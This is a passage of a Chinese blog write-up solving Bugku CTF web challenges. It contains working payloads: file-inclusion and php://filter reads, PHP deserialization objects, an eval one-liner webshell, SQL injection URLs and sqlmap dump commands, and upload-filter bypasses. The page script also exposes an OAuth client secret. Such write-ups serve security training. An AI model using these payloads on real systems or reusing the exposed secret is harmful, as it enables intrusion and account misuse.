+<pre><code>%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E
+</code></pre>
+<p>还是url编码，再进行解码</p>
+<pre><code>if(!$_GET[&#39;id&#39;])
+&#123;
+    header(&#39;Location: hello.php?id=1&#39;);
+    exit();
+&#125;
+$id=$_GET[&#39;id&#39;];
+$a=$_GET[&#39;a&#39;];
+$b=$_GET[&#39;b&#39;];
+if(stripos($a,&#39;.&#39;))
+&#123;
+    echo &#39;no no no no no no no&#39;;
+    return ;
+&#125;
+$data = @file_get_contents($a,&#39;r&#39;);
+if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+&#123;
+    require(&quot;f4l2a3g.txt&quot;);
+&#125;
+else
+&#123;
+    print &quot;never never never give up !!!&quot;;
+&#125;
+</code></pre>
+<p>看似需要满足很多条件才能得到flag，事实上满足条件之后也只是把f4l2a3g.txt文件内容打印出来而已，直接访问这个文件即可得到flag <br /></p>
+<h1 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h1><p>右键查看源代码，发现源码提示</p>
+<pre><code>&lt;!--  
+$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+  
+if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;))&#123;  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+&#125;else&#123;  
+    echo &quot;you are not admin ! &quot;;  
+&#125;  
+ --&gt;  
+</code></pre>
+<p>file_get_contents函数将一个文件读入字符串中，只要使用php:&#x2F;&#x2F;input请求流即可，因为php:&#x2F;&#x2F;input拿的是post中的数据，所以需要在post框中输入welcome to the bugkuctf <br /><br><code>include($file)</code>可以看出是明显的文件包含，可以利用php:&#x2F;&#x2F;filter来读取源码 <br /></p>
+<pre><code>?txt=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;&amp;password=
+[POST DATA]
+welcome to the bugkuctf
+</code></pre>
+<p>把得到的base64编码解码之后得到源码</p>
+<pre><code>&lt;?php  
+  
+class Flag&#123;//flag.php  
+    public $file;  
+    public function __tostring()&#123;  
+        if(isset($this-&gt;file))&#123;  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;good&quot;);
+        &#125;  
+    &#125;  
+&#125;  
+?&gt;  
+</code></pre>
+<p>尝试包含flag.php，出现乱码，再包含index.php</p>
+<pre><code>&lt;?php  
+$txt = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$password = $_GET[&quot;password&quot;];  
+  
+if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;))&#123;  
+    echo &quot;hello friend!&lt;br&gt;&quot;;  
+    if(preg_match(&quot;/flag/&quot;,$file))&#123; 
+        echo &quot;涓嶈兘鐜板湪灏辩粰浣爁lag鍝�&quot;;
+        exit();  
+    &#125;else&#123;  
+        include($file);   
+        $password = unserialize($password);  
+        echo $password;  
+    &#125;  
+&#125;else&#123;  
+    echo &quot;you are not the number of bugku ! &quot;;  
+&#125;  
+  
+?&gt;  
+  
+&lt;!--  
+$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+  
+if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;))&#123;  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+&#125;else&#123;  
+    echo &quot;you are not admin ! &quot;;  
+&#125;  
+ --&gt;  
+</code></pre>
+<p>发现只要序列化flag，当flag对象被转换为字符串时，会执行__tostring()，且会输出$file参数的内容，提示参数的内容是flag.php <br /><br>本地序列化一下Flag对象</p>
+<pre><code>&lt;?php  
+      
+    class Flag&#123;//flag.php  
+        public $file;  
+        public function __tostring()&#123;  
+            if(isset($this-&gt;file))&#123;  
+                echo file_get_contents($this-&gt;file); 
+                echo &quot;&lt;br&gt;&quot;;
+            return (&quot;good&quot;);
+            &#125;  
+        &#125;  
+    &#125;   
+$a = new Flag;
+$a-&gt;file = &quot;flag.php&quot;;
+echo serialize($a);
+输出：O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;
+</code></pre>
+<p>通过password将Flag序列化之后的值传入即可得到flag <br /></p>
+<pre><code>?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;
+[POST DATA]
+welcome to the bugkuctf
+</code></pre>
+<p>还有一种思路，利用文件包含漏洞远程执行php代码，写入一个一句话木马，用菜刀连接也可以得到flag</p>
+<pre><code>http://120.24.86.145:8006/test1/?txt=php://input&amp;file=data://text/plain,&lt;?php fputs(fopen(&quot;shells.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_GET[a]) ?&gt;&quot;);phpinfo();  ?&gt;&amp;password=3&amp;a=$_POST[a]
+[POST DATA]
+welcome to the bugkuctf
+</code></pre>
+<h1 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h1><p>分析提示中的代码</p>
+<pre><code>$poc=&quot;a#s#s#e#r#t&quot;; 
+$poc_1=explode(&quot;#&quot;,$poc);	把poc的字符串以#分割成数组
+$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 		将数组中的值按照012345的顺序排起来，即assert
+$poc_2($_GET[&#39;s&#39;]) ?&gt;	可以看成assert($_GET[&#39;s&#39;])
+</code></pre>
+<p>assert可以将输入的字符串当做php代码来执行，这就是一个任意代码执行漏洞</p>
+<pre><code>?s=print_r(scandir(&#39;./&#39;))
+访问f14g.txt即可获得flag
+</code></pre>
+<h1 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h1><p>访问获得源代码</p>
+<pre><code> &lt;?php 
+highlight_file(&#39;2.php&#39;);
+$key=&#39;KEY&#123;********************************&#125;&#39;;
+$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
+if( $IM )&#123; 
+  die(&#39;key is: &#39;.$key);
+&#125;
+?&gt; 
+</code></pre>
+<p>关键点在于中间匹配的正则表达式，匹配成功则输出flag <br /></p>
+<pre><code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i
+</code></pre>
+<p>表达式的意思为，开头两个key，两个key中间有任意0或多个字符，两个key之后有一个任意字符，这个字符要重复4到7次，之后有一个key：，key：之后有一对&#x2F;&#x2F;，中间有任意一个字符，然后是0或多字个符，再是一个key，之后是任意一个小写字母，最后是任意一个标点符号 <br /><br>按照上面说的，结合起来传入即可获得flag <br /></p>
+<pre><code>?id=keykeyaaaakey:/a/keya:
+</code></pre>
+<h1 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h1><p>右键源代码，发现有提示code.txt，访问这个文件，得到源代码</p>
+<pre><code>&lt;?php
+if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
+    $v1 = $_GET[&#39;v1&#39;];
+    $v2 = $_GET[&#39;v2&#39;];
+    $v3 = $_GET[&#39;v3&#39;];
+    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;
+        if(!strcmp($v3, $flag))&#123;
+            echo $flag;
+        &#125;
+    &#125;
+&#125;
+?&gt;
+    
+</code></pre>
+<p>这题跟之前做过的md5弱类型比较一样，要求传入的v1和v2的值不一样，但是md5值一样 <br /><br>绕过这一层之后，还有一层<code>!strcmp($v3, $flag)</code>，这里利用strcmp函数本身的漏洞，当传入的值为数组，函数会null，取反之后就会变成true从而达成绕过 <br /><br>strcmp输入一个数组就会返回null <br /></p>
+<pre><code>?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=1
+</code></pre>
+<h1 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h1><p>init为约束攻击，直接点击注册页面，输入admin 1(admin和1之间有非常多的空格)，密码随意，用这个密码登录admin账号即可获得flag <br /><br>约束攻击的原理是，当mysql执行插入语句时，如果插入的值超过一定的长度(好像是32位)，就会把超出的部分丢掉，只插入前面的部分，而空格在存入数据库时也会被丢掉。但是如果空格后面还有字符的话，空格就不会被丢掉，所以输入admin 1，当之间的空格足够多以至于超过限度时，mysql就会把超过的部分丢掉，丢掉之后，因为admin后面都是空格，在存入的时候就变成了admin，相当于重新创建了一个admin账号</p>
+<h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><p>打开网页，问你是不是从google来的，用bp抓包，增加一个referer字段即可</p>
+<pre><code>Referer: https://www.google.com
+</code></pre>
+<h1 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h1><p>题目名字为md5碰撞，碰撞的意思是值不同但是md5值相同，输入?a&#x3D;s878926199a即可返回flag <br /><br>需要注意的是，如果输入的值是QNKCDZO，虽然也是md5碰撞，但是不会返回flag，猜测服务器端是用QNKCDZO来进行比较的</p>
+<h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><p>要求从本地访问，用bp抓包，加上X-Forwarded-For: 127.0.0.1字段即可</p>
+<h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><pre><code> &lt;?php
+highlight_file(&#39;flag.php&#39;);
+$_GET[&#39;id&#39;] = urldecode($_GET[&#39;id&#39;]);
+$flag = &#39;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#39;;
+if (isset($_GET[&#39;uname&#39;]) and isset($_POST[&#39;passwd&#39;])) &#123;
+    if ($_GET[&#39;uname&#39;] == $_POST[&#39;passwd&#39;])
+
+        print &#39;passwd can not be uname.&#39;;
+
+    else if (sha1($_GET[&#39;uname&#39;]) === sha1($_POST[&#39;passwd&#39;])&amp;($_GET[&#39;id&#39;]==&#39;margin&#39;))
+
+        die(&#39;Flag: &#39;.$flag);
+
+    else
+
+        print &#39;sorry!&#39;;
+
+&#125;
+?&gt; 
+</code></pre>
+<p>要求输入的uname和passwd的sha1值相同但值不同，sha1和ma5一样，处理不了数组，输入数组即可绕过，注意passwd要用post输入。id值只要等于margin就行</p>
+<pre><code>http://120.24.86.145:8002/web7/?uname[]=123&amp;id=margin
+[POST DATA]
+passwd[]=1234
+</code></pre>
+<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><pre><code>&lt;?php
+extract($_GET);
+if (!empty($ac))
+&#123;
+$f = trim(file_get_contents($fn));
+if ($ac === $f)
+&#123;
+echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;
+&#125;
+else
+&#123;
+echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
+&#125;
+&#125;
+?&gt;
+</code></pre>
+<p>看到file_get_contents函数，无脑php伪协议就完事了</p>
+<pre><code>?ac=1&amp;fn=php://input
+[POST DATA]
+1
+</code></pre>
+<h1 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h1><p>如果有源代码的话，这题其实不难，但是没有源代码的情况下，这题其实很难解，只能说打ctf太需要脑洞了 <br /><br>服务器端架设了waf，当waf检测到Content-Type：multipart&#x2F;form-data字段时，会去检查文件后缀是否有php，如果有则拦下，这里用大小写绕过，Content-Type：Multipart&#x2F;form-data即可 <br /><br>绕过waf之后，因为是黑名单检测，只过滤了php，用php5也可以绕过，把文件名改为php.php5即可 <br /></p>
+<pre><code>php、php3、php4、php5、pht、phtml这些都会被解析成php
+</code></pre>
+<h1 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h1><p>这是一个很简单的登录框 <br /><br>没有过滤任何东西，直接在username框中注入即可，因为有回显和报错，所以报错注入也是可以的 <br /><br>用sqlmap跑也是一种方法 <br /><br>因为是post注入，可以用bp，抓包之后右键copy to file，然后用sqlmap跑 <br /></p>
+<pre><code>sqlmap.py -r &quot;D:\1.txt&quot; -p admin_name --dbs
+sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -p admin_name --tables
+sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns
+sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump
+</code></pre>
+<h1 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h1><p>修改id可以看到提示是sql注入 <br /><br>这里的注入比较简单，可以用异或注入来判断到底过滤了什么 <br /></p>
+<pre><code>在id=1后面输入&#39;^(0)^&#39;
+不出错
+把0换成1=1
+出错
+表示可以使用异或注入
+异或注入时，如果括号中的内容是真的，那页面会返回错误
+那么同理，如果我修改里面的内容为length(‘union’)!=0
+如果页面显示正确，那就证明length(‘union’)是等于0的，也就是union被过滤了
+</code></pre>
+<p>测试之后发现union&#x2F;select&#x2F;or&#x2F;and被过滤了，重写绕过即可 <br /><br>注入之后发现表中有两个字段，flag1和address，flag1中是一串意义不明的代码，address是下一关地址，点进去发现还是一个注入 <br /><br>测试过后发现重写不管用了，但是会回显错误信息，用报错注入 <br /></p>
+<pre><code>http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 0x776562313030322d32 ),0x7e),1) %23
+class,flag2
+http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name =0x666c616732 ),0x7e),1) %23
+flag2,address
+http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(address) from flag2 ),0x7e),1) %23
+http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag2) from flag2 ),0x7e),1) %23
+./Have_Fun.php
+</code></pre>
+<p>其实这里已经注出flag，但是还有个address字段，内容是&#x2F;Have_Fun.php，访问之后提示只能192.168.0.100才能访问 <br /><br>bp抓包之后，加入CLIENT-IP: 192.168.0.100字段，访问成功，是一个二维码，扫出的结果如下 <br /></p>
+<pre><code>你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&amp;$as%_=#*ad…*@#！*&amp;@…c……
+</code></pre>
+<p>猜测还是注入，但是不管在哪个页面都没用，flag在admin里，也有可能是文件包含 <br /><br>题目中说的第二个flag应该是在这里找，但是似乎没有人去找过</p>
+<h1 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h1><p>进入网页，url中的file&#x3D;hello.php很可疑 <br /><br>话虽如此，但是php伪协议好像是被过滤了 <br /><br>右键源代码，发现了upload.php的提示，点进去发现是文件上传 <br /><br>试了一下，发现过滤规则还蛮严的，好像过滤了&lt;php和?&gt;，但因为存在文件包含，所以我们不必非要传一个php上去，构造一句话木马 </p>
+<pre><code>GIF89a
+&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;
+</code></pre>
+<p>之后访问这个文件，查看源代码就可以发现有一个this_is_th3_F14g_154f65sd4g35f4d6f43.txt，访问就是flag</p>
+<h1 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h1><p>提示中的hint居然是参数，做CTF真的是很需要脑洞 <br /><br>输入<code>120.24.86.145:8002/flagphp/?hint=1</code>可以获得源代码 <br /></p>
+<pre><code> &lt;?php
+error_reporting(0);
+include_once(&quot;flag.php&quot;);
+$cookie = $_COOKIE[&#39;ISecer&#39;];
+if(isset($_GET[&#39;hint&#39;]))&#123;
+    show_source(__FILE__);
+&#125;
+elseif (unserialize($cookie) === &quot;$KEY&quot;)
+&#123;   
+    echo &quot;$flag&quot;;
+&#125;
+else &#123;
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+&lt;title&gt;Login&lt;/title&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;br&gt;
+&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;
+  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;
+    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;
+  &lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+&#125;
+$KEY=&#39;ISecer:www.isecer.com&#39;;
+?&gt; 
+</code></pre>
+<p>审计代码之后可知，只要用cookie传入一个序列化之后的值，这个值通过反序列化之后与$key值相等即可输出flag <br /><br>需要注意的是，$key值到最后才定义，也就是说事实上在前面的if语句中，$key值是null <br /><br>本地调试 <br /></p>
+<pre><code>$cookie = serialize(&#39;&#39;);
+echo $cookie; //s:0:&quot;&quot;;
+var_dump(unserialize($cookie) === &quot;$KEY&quot;); //bool(true)
+</code></pre>
+<p>null序列化之后的值为<code>s:0:&quot;&quot;;</code> <br /><br>由于传入cookie值时，；不会被传过去，所以需要url编码才行 <br /></p>
+<pre><code>Cookie: ISecer=s:0:&quot;&quot;%3b
+</code></pre>
+<h1 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h1><p>渗透的第一步，信息收集 <br /><br>御剑扫出个robots.txt，点进去就是flag了 <br /></p>
+<p>未完待续</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://perfect-time.xyz">LINK</a>
+            <p>原文链接: <a href="https://perfect-time.xyz/2018/10/22/bugku-wp/">https://perfect-time.xyz/2018/10/22/bugku-wp/</a>
+            <p>发表日期: <a href="https://perfect-time.xyz/2018/10/22/bugku-wp/">October 22nd 2018, 8:19:47 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/10/26/CGCTF-wp/" title= cgctf-web-wp >
+                    <div class="nextTitle">cgctf-web-wp</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/10/18/python-auto-script/" title= python自动化脚本学习笔记 >
+                    <div class="prevTitle">python自动化脚本学习笔记</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+<div id="container"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+        // id: "bugku-web-wp", // 可选。默认为 location.href
+        owner: 'a1055883471',
+        repo: 'a1055883471.github.io',
+        oauth: {
+            client_id: '4514a03a15dc92fbdd90',
+            client_secret: 'cdffbd6889428a82f7232c85f4ccd95cf70b2211',
+        },
+    })
+    gitment.render('container')
+
+</script>
+
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=gPf3966ytbewsMDx8a7j7_0" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/a1055883471" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qrcode_1530688616677.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web2"><span class="toc-number">1.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">计算器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E5%9F%BA%E7%A1%80-GET"><span class="toc-number">3.</span> <span class="toc-text">web基础$_GET</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E5%9F%BA%E7%A1%80-POST"><span class="toc-number">4.</span> <span class="toc-text">web基础$_POST</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%9B%E7%9B%BE"><span class="toc-number">5.</span> <span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web3"><span class="toc-number">6.</span> <span class="toc-text">web3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B"><span class="toc-number">8.</span> <span class="toc-text">你必须让他停下</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-number">9.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%98%E9%87%8F1"><span class="toc-number">10.</span> <span class="toc-text">变量1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web5"><span class="toc-number">11.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%B4%E7%AD%89%E8%88%B1"><span class="toc-number">12.</span> <span class="toc-text">头等舱</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="toc-number">13.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F"><span class="toc-number">14.</span> <span class="toc-text">管理员系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web4"><span class="toc-number">15.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag%E5%9C%A8index%E9%87%8C"><span class="toc-number">16.</span> <span class="toc-text">flag在index里</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag"><span class="toc-number">17.</span> <span class="toc-text">输入密码查看flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A1"><span class="toc-number">18.</span> <span class="toc-text">点击一百万次</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AC%E8%AF%B4%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF"><span class="toc-number">19.</span> <span class="toc-text">听说备份是个好习惯</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%90%E7%BB%A9%E5%8D%95"><span class="toc-number">20.</span> <span class="toc-text">成绩单</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA"><span class="toc-number">21.</span> <span class="toc-text">秋名山老司机</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB"><span class="toc-number">22.</span> <span class="toc-text">速度要快</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie%E6%AC%BA%E9%AA%97"><span class="toc-number">23.</span> <span class="toc-text">cookie欺骗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#never-give-up"><span class="toc-number">24.</span> <span class="toc-text">never give up</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#welcome-to-bugkuctf"><span class="toc-number">25.</span> <span class="toc-text">welcome to bugkuctf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">26.</span> <span class="toc-text">过狗一句话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F"><span class="toc-number">27.</span> <span class="toc-text">字符？正则？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E5%A5%B3%E5%8F%8B"><span class="toc-number">28.</span> <span class="toc-text">前女友</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login1-SKCTF"><span class="toc-number">29.</span> <span class="toc-text">login1(SKCTF)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="toc-number">30.</span> <span class="toc-text">你从哪里来</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5-collision-NUPT-CTF"><span class="toc-number">31.</span> <span class="toc-text">md5 collision(NUPT_CTF)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99"><span class="toc-number">32.</span> <span class="toc-text">程序员本地网站</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">33.</span> <span class="toc-text">各种绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web8"><span class="toc-number">34.</span> <span class="toc-text">web8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B1%82getshell"><span class="toc-number">35.</span> <span class="toc-text">求getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86"><span class="toc-number">36.</span> <span class="toc-text">这是一个神奇的登录框</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%9A%E6%AC%A1"><span class="toc-number">37.</span> <span class="toc-text">多次</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 